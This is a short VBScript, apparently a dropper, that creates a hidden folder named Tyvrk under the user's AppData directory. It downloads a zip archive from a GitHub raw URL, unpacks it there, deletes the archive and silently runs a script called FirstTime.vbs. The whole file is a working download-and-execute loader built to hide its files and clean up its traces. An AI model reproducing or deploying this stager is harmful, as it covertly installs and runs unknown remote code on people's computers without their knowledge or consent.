Set objShell = CreateObject("WScript.Shell")
Roaming = objShell.ExpandEnvironmentStrings("%AppData%")
Tyvrk = Roaming & "\Tyvrk"
Set objFSO = CreateObject("Scripting.FileSystemObject")

'Create tyvrk
If Not objFSO.FolderExists(Tyvrk) Then
objFSO.CreateFolder(Tyvrk)
End If

'Hide Tyvrk
Set objFolder = objFSO.GetFolder(Tyvrk)
objFolder.Attributes = objFolder.Attributes OR 2

'Download Tyvrk
sFile = "Tyvrk.zip"
sFilePath = Tyvrk & "\" & sFile
URL = "https://raw.githubusercontent.com/ComissionScolaireDeMontreal/Tyvrk/master/Tyvrk"

If Not (objFSO.FileExists(sFilePath)) Then
dim xHttp: Set xHttp = createobject("Msxml2.ServerXMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", URL, False
xHttp.Send

with bStrm
.type = 1
.open
.write xHttp.responseBody
.savetofile sFilePath, 2
end with
End If

'UnZIP
ZipFile = sFilePath
ExtractTo = TyVrk

sourceFile = objFSO.GetAbsolutePathName(ZipFile)
destFolder = objFSO.GetAbsolutePathName(ExtractTo)

Set objApp = CreateObject("Shell.Application")
Set FilesInZip = objApp.NameSpace(sourceFile).Items()
objApp.NameSpace(destFolder).copyHere FilesInZip, 16

'Delete the Tyvrk.zip
objFSO.DeleteFile(sFilePath)

'Run FirstTime.vbs
objShell.Run(Tyvrk & "\FirstTime.vbs")

'Clean & Exit
Set objFSO = Nothing
Set objShell = Nothing
Set objApp = Nothing
Set FilesInZip = Nothing

WScript.Quit